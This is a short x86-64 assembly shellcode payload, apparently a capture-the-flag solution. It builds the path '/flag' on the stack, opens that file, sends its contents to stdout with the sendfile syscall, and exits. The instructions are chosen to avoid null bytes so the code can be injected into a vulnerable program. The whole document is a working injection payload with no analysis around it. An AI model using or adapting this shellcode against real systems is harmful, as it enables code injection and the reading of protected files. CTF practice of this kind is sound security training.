.global _start
_start:
.intel_syntax noprefix

xor rbx, rbx            # clear rbx register
mov ebx, 0x67616c66     # "flag"
shl rbx, 8              # make space for 2 bytes at bl
mov bl, 0x2f            # "/"
push rbx                
xor rax, rax            # rax = 0
mov al, 2               # syscall open
mov rdi, rsp            # filename
xor rsi, rsi            # rsi = 0
syscall                 

xor rdi, rdi            # rdi = 0
mov dil, 1              # {1}
mov rsi, rax            # {2}
xor rdx, rdx            # {3}
mov r10w, 1000          # {4}
xor rax, rax           
mov al, 40              # syscall sendfile
syscall                 

xor rax,rax             
mov al, 60              # exit()
syscall       
